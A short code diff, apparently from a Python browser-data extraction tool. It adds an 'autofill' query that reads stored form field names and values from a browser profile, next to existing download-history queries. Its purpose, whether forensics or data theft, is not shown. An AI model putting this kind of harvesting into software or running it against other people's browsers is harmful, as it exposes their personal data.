@@ -79,7 +79,14 @@ data_queries = {
         'columns': ['Download URL', 'Local Path'],
         'decrypt': False
     },
+    'autofill': {
+        'query': 'SELECT field_name, field_value FROM autofill_data',
+        'file': '\\Autofill Data',
+        'columns': ['Field Name', 'Field Value'],
+        'decrypt': False  # Modify decrypt value as needed
+    }
 }
+
 
 def installed_browsers():
     available = []
